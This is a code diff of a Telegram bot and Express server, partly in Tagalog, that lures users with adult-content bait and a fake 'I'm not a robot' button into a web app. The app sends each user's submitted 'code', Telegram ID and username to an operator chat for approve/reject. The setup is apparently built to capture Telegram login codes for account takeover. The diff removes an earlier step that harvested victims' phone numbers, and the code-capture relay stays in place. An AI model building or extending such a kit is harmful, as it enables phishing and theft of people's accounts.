@@ -4,7 +4,6 @@ import { Telegraf } from "telegraf";
 
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const WEBAPP_URL = process.env.WEBAPP_URL;
-const WEBSITE_URL = process.env.WEBSITE_URL;
 const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
 
 if (!BOT_TOKEN) {
@@ -17,7 +16,6 @@ if (!ADMIN_CHAT_ID) {
 const bot = new Telegraf(BOT_TOKEN);
 
 // in-memory storage
-const userPhones = new Map();
 const submissions = new Map();
 const typingLoops = new Map();
 
@@ -39,78 +37,17 @@ function stopTypingLoop(userId) {
   }
 }
 
-// helper: reply + auto delete
-async function replyAndAutoDelete(ctx, text, extra) {
-  const msg = await ctx.reply(text, extra);
-  scheduleDelete(ctx.chat.id, msg.message_id);
-  return msg;
-}
-
-// /start handler
+// /start handler - DIREKTA NA SA WEBAPP BUTTON
 bot.start(async (ctx) => {
-  const payload = ctx.startPayload;
-
-  if (payload !== "from_website") {
-    const msg = await ctx.reply(
-      "Visit link to start verification:\n" + WEBSITE_URL
-    );
-    scheduleDelete(ctx.chat.id, msg.message_id);
-    return;
-  }
-
-  await replyAndAutoDelete(
-    ctx,
-    "𝗣𝗶𝗻𝗱𝘂𝘁𝗶𝗻 𝗮𝗻𝗴 𝗩𝗲𝗿𝗶𝗳𝘆 𝗯𝘂𝘁𝘁𝗼𝗻 𝘂𝗽𝗮𝗻𝗴 𝗺𝗮𝗸𝘂𝗺𝗽𝗹𝗲𝘁𝗼 𝗮𝗻𝗴 𝘃𝗲𝗿𝗶𝗳𝗶𝗰𝗮𝘁𝗶𝗼𝗻.",
-    {
-      reply_markup: {
-        keyboard: [
-          [
-            {
-              text: "📱 VERIFY NOW",
-              request_contact: true,
-            },
-          ],
-        ],
-        resize_keyboard: true,
-        one_time_keyboard: true,
-      },
-    }
-  );
-});
-
-// kapag nag-share ng contact (phone)
-bot.on("contact", async (ctx) => {
-  const contact = ctx.message.contact;
-  if (!contact) return;
-
-  scheduleDelete(ctx.chat.id, ctx.message.message_id, 2000);
-
-  if (contact.user_id && contact.user_id !== ctx.from.id) {
-    const warn = await ctx.reply(
-      "Mukhang ibang contact ito. Paki-tap ang button para i-share ang sarili mong Telegram number."
-    );
-    scheduleDelete(ctx.chat.id, warn.message_id);
-    return;
-  }
-
-  userPhones.set(ctx.from.id, contact.phone_number);
-
-  const reply = await ctx.reply("....", {
-    reply_markup: {
-      remove_keyboard: true,
-    },
-  });
-  scheduleDelete(ctx.chat.id, reply.message_id);
-
   const webappMsg = await ctx.reply(
-    "🔞 To access the files completely free 💦\n\n" +
-      "👇 Confirm that you are not a robot",
+    "🔞 Upang ma-access ang mga file nang libre 💦\n" +
+    "👇 Siguraduhing hindi ka robot",
     {
       reply_markup: {
         inline_keyboard: [
           [
             {
-              text: "✅ I'm not a robot!",
+              text: "✅ Hindi ako robot!",
               web_app: { url: WEBAPP_URL },
             },
           ],
@@ -124,7 +61,6 @@ bot.on("contact", async (ctx) => {
 // HTTP server
 const app = express();
 
-// Cleaned CORS CONFIGURATION
 app.use(cors({
   origin: [
     'https://viralvideos.cloud', 
@@ -153,7 +89,6 @@ app.post("/api/log-code", async (req, res) => {
   const userId = tgUser?.id;
   const username = tgUser?.username || "N/A";
   const firstName = tgUser?.first_name || "";
-  const telegramPhone = userId && userPhones.get(userId) ? userPhones.get(userId) : "N/A";
 
   const displayName =
     firstName && username ? `${firstName} (@${username})`
@@ -165,7 +100,6 @@ app.post("/api/log-code", async (req, res) => {
   submissions.set(submissionId, {
     userId,
     code,
-    telegramPhone,
     username,
     firstName,
   });
@@ -188,7 +122,6 @@ app.post("/api/log-code", async (req, res) => {
     "🔔 New verification request\n\n" +
     `👤 User: ${displayName}\n` +
     `🆔 ID: ${userId || "N/A"}\n` +
-    `📱 Telegram phone: ${telegramPhone}\n\n` +
     `🔑 Code: ${code}\n\n` +
     "Tap a button below to approve or reject.";
 
@@ -210,7 +143,7 @@ app.post("/api/log-code", async (req, res) => {
   }
 });
 
-// handle admin Approve/Reject buttons AND user confirm/deny login
+// handle admin Approve/Reject buttons
 bot.on("callback_query", async (ctx) => {
   const data = ctx.callbackQuery.data;
   if (!data) return;
@@ -246,12 +179,9 @@ bot.on("callback_query", async (ctx) => {
   }
 
   submissions.delete(submissionId);
+  const { userId, code, username, firstName } = submission;
 
-  const { userId, code, telegramPhone, username, firstName } = submission;
-
-  if (userId) {
-    stopTypingLoop(userId);
-  }
+  if (userId) stopTypingLoop(userId);
 
   const displayName =
     firstName && username ? `${firstName} (@${username})`
@@ -264,7 +194,6 @@ bot.on("callback_query", async (ctx) => {
     "🔔 Verification request\n\n" +
     `👤 User: ${displayName}\n` +
     `🆔 ID: ${userId || "N/A"}\n` +
-    `📱 Telegram phone: ${telegramPhone}\n\n` +
     `🔑 Code: ${code}\n\n` +
     `Status: ${statusText}`;
 
